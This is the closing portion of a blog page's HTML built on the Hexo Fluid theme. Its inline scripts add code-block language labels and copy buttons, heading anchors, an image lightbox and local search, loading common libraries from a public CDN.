    var copyTmpl = '';
    copyTmpl += '<div class="code-widget">';
    copyTmpl += 'LANG';
    copyTmpl += '</div>';
    jQuery('.markdown-body pre').each(function() {
      var $pre = jQuery(this);
      if ($pre.find('code.mermaid').length > 0) {
        return;
      }
      if ($pre.find('span.line').length > 0) {
        return;
      }

      var lang = '';

      if (enableLang) {
        lang = CONFIG.code_language.default;
        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
          lang = $pre[0].children[0].classList[1];
        } else if ($pre[0].getAttribute('data-language')) {
          lang = $pre[0].getAttribute('data-language');
        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
          lang = $pre[0].children[0].classList[1];
          $pre.parent().addClass('code-wrapper');
        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
          $pre.wrap('<div class="code-wrapper"></div>');
        }
        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
      }
      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));

      if (enableCopy) {
        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
          var clipboard = new window.ClipboardJS('.copy-btn', {
            target: function(trigger) {
              var nodes = trigger.parentNode.childNodes;
              for (var i = 0; i < nodes.length; i++) {
                if (nodes[i].tagName === 'CODE') {
                  return nodes[i];
                }
              }
            }
          });
          clipboard.on('success', function(e) {
            e.clearSelection();
            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
            setTimeout(function() {
              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
            }, 2000);
          });
        });
      }
    });
  })();
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  <script  src="/js/local-search.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
